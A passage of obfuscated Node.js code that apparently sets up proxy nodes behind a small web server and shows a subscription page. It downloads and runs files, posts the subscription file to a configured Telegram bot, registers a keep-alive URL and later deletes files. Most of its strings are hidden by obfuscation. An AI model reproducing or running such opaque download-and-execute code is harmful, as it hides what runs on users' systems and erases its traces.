          ;(console['clear'](), alwaysLog(_0x3dcd0c(0x1d0)), console[_0x3dcd0c(0x259)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!'))
        })
      : exec(_0x145c6a(0x224) + _0x547199[_0x145c6a(0x230)]('\x20') + _0x145c6a(_0x3f2a1c._0x1ea279), (_0x155d18) => {
          const _0x2adeda = _0x145c6a
          ;(console[_0x2adeda(0x1c9)](),
            alwaysLog(_0x2adeda(0x1d0)),
            console[_0x2adeda(0x259)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!'))
        })
  }, 0x15f90)
}
cleanFiles()
async function sendTelegram() {
  const _0x58ea33 = {
      _0x2cb8e2: 0x259,
      _0x6a7aaa: 0x17d,
      _0x15bce5: 0x1b7,
      _0x519c59: 0x193,
      _0x5d0e9a: 0x159,
      _0x24ae7e: 0x19e,
      _0x18ea5d: 0x16b,
      _0x3f5ce1: 0x1a9,
      _0x38ac1d: 0x18a
    },
    _0x1c0c9a = _0x5e8f37
  if (!BOT_TOKEN || !CHAT_ID) {
    console[_0x1c0c9a(_0x58ea33._0x2cb8e2)](_0x1c0c9a(_0x58ea33._0x6a7aaa))
    return
  }
  try {
    const _0x55cfa3 = fs['readFileSync'](subPath, _0x1c0c9a(0x169)),
      _0x3c31b0 = 'https://api.telegram.org/bot' + BOT_TOKEN + _0x1c0c9a(_0x58ea33._0x15bce5),
      _0x4a7c2c = NAME[_0x1c0c9a(_0x58ea33._0x519c59)](/[_*\[\]()~`>#+=|{}.!-]/g, _0x1c0c9a(_0x58ea33._0x5d0e9a)),
      _0x828bdb = {
        chat_id: CHAT_ID,
        text: '**' + _0x4a7c2c + _0x1c0c9a(_0x58ea33._0x24ae7e) + _0x55cfa3 + _0x1c0c9a(0x18f),
        parse_mode: _0x1c0c9a(_0x58ea33._0x18ea5d)
      }
    ;(await axios[_0x1c0c9a(0x1ff)](_0x3c31b0, null, { params: _0x828bdb }), console[_0x1c0c9a(0x259)](_0x1c0c9a(0x1f8)))
  } catch (_0x875b8f) {
    console[_0x1c0c9a(_0x58ea33._0x3f5ce1)](_0x1c0c9a(0x27c), _0x875b8f[_0x1c0c9a(_0x58ea33._0x38ac1d)])
  }
}
async function AddVisitTask() {
  const _0x33c21 = { _0x38ac65: 0x259, _0x138a0c: 0x195, _0xde954c: 0x1df, _0x435b2a: 0x275, _0x8321c5: 0x1a9, _0x258350: 0x247 },
    _0x4ac57a = _0x5e8f37
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console[_0x4ac57a(_0x33c21._0x38ac65)](_0x4ac57a(_0x33c21._0x138a0c))
    return
  }
  try {
    const _0x3caaab = await axios[_0x4ac57a(0x1ff)](
      _0x4ac57a(0x262),
      { url: PROJECT_URL },
      { headers: { 'Content-Type': _0x4ac57a(_0x33c21._0xde954c) } }
    )
    return (console['log'](_0x4ac57a(_0x33c21._0x435b2a)), _0x3caaab)
  } catch (_0x40753c) {
    return (console[_0x4ac57a(_0x33c21._0x8321c5)](_0x4ac57a(_0x33c21._0x258350) + _0x40753c['message']), null)
  }
}
async function startserver() {
  const _0x4c4ea8 = { _0x5844a0: 0x254 },
    _0x1fd048 = _0x5e8f37
  try {
    ;(argoType(),
      deleteNodes(),
      cleanupOldFiles(),
      isValidPort(REALITY_PORT) && generateOrLoadKeyPair(),
      isValidPort(HY2_PORT) && ensureTlsCertificates(certPath, keyPath),
      await generateConfig(),
      await downloadFilesAndRun(),
      await extractDomains(),
      await sendTelegram(),
      await AddVisitTask())
  } catch (_0x406fc3) {
    console[_0x1fd048(0x1a9)](_0x1fd048(_0x4c4ea8._0x5844a0), _0x406fc3)
  }
}
startserver()[_0x5e8f37(0x189)]((_0x2018d3) => {
  const _0x13675a = { _0x5cb682: 0x1a9 },
    _0x5d8777 = _0x5e8f37
  console[_0x5d8777(_0x13675a._0x5cb682)](_0x5d8777(0x1f4), _0x2018d3)
})
const server = http[_0x5e8f37(0x1ee)](async (_0x883409, _0x382fd8) => {
  const _0x2194db = {
      _0x4cbdca: 0x182,
      _0x216e3b: 0x157,
      _0x2643e9: 0x238,
      _0x337524: 0x279,
      _0x4f1592: 0x157,
      _0x3118c5: 0x238,
      _0x1e5007: 0x182,
      _0x44677a: 0x15b,
      _0x3dd425: 0x24b,
      _0x404e0e: 0x238,
      _0x1f1519: 0x182,
      _0x4df247: 0x1d6,
      _0x15a485: 0x1fc
    },
    _0x492952 = _0x5e8f37,
    _0x18e877 = _0x883409[_0x492952(0x1e1)][_0x492952(0x206)]('?')[0x0]
  if (_0x18e877 === '/' + SUB_PATH) {
    if (subContent)
      (_0x382fd8[_0x492952(_0x2194db._0x4cbdca)](0xc8, { 'Content-Type': _0x492952(_0x2194db._0x216e3b) }),
        _0x382fd8[_0x492952(_0x2194db._0x2643e9)](subContent))
    else
      try {
        const _0x216ba0 = fs[_0x492952(0x1b8)](subPath, _0x492952(_0x2194db._0x337524))
        ;(_0x382fd8[_0x492952(0x182)](0xc8, { 'Content-Type': _0x492952(_0x2194db._0x4f1592) }), _0x382fd8[_0x492952(_0x2194db._0x3118c5)](_0x216ba0))
      } catch (_0x2c36c6) {
        ;(_0x382fd8[_0x492952(_0x2194db._0x1e5007)](0x1f7, { 'Content-Type': _0x492952(0x157) }),
          _0x382fd8[_0x492952(0x238)]('Subscription\x20content\x20not\x20yet\x20available,\x20please\x20try\x20again\x20later.'))
      }
    return
  }
  if (_0x18e877 === '/') {
    try {
      const _0x1aa648 = path[_0x492952(0x230)](__dirname, _0x492952(0x1c1)),
        _0xdcd6d1 = await fs[_0x492952(0x1cc)][_0x492952(_0x2194db._0x44677a)](_0x1aa648, _0x492952(0x169))
      ;(_0x382fd8[_0x492952(0x182)](0xc8, { 'Content-Type': _0x492952(_0x2194db._0x3dd425) }), _0x382fd8[_0x492952(_0x2194db._0x404e0e)](_0xdcd6d1))
    } catch (_0x583fba) {
      ;(_0x382fd8[_0x492952(_0x2194db._0x1f1519)](0xc8, { 'Content-Type': 'text/html;\x20charset=utf-8' }),
        _0x382fd8[_0x492952(0x238)](_0x492952(_0x2194db._0x4df247)))
    }
    return
  }
  ;(_0x382fd8[_0x492952(0x182)](0x194, { 'Content-Type': _0x492952(_0x2194db._0x216e3b) }),
    _0x382fd8[_0x492952(_0x2194db._0x404e0e)](_0x492952(_0x2194db._0x15a485)))
})
server[_0x5e8f37(0x1f1)](PORT, () => alwaysLog(_0x5e8f37(0x1d7) + PORT + '!'))
